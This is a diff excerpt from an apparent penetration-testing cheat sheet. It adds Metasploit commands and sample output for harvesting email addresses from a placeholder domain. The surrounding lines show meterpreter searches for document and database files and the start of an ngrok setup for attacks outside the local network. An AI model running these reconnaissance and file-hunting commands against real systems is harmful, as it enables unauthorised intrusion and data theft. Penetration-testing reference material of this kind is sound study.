@@ -593,6 +593,18 @@ meterpreter> search -f *.docx
 meterpreter> search -f *.sql
 ```
 
+Metasploit Email Harvesting:
+
+```
+msf6 auxiliary(gather/search_email_collector) > set OUTFILE /tmp/emails.txt
+OUTFILE => /tmp/emails.txt
+msf6 auxiliary(gather/search_email_collector) > set DOMAIN target.com
+DOMAIN => target.com
+msf6 auxiliary(gather/search_email_collector) > run
+
+[*] Harvesting emails.....
+```
+
 Attack outside of the LAN with ngrok:
 
 First step, set up a free account in ngrok then start ngrok:
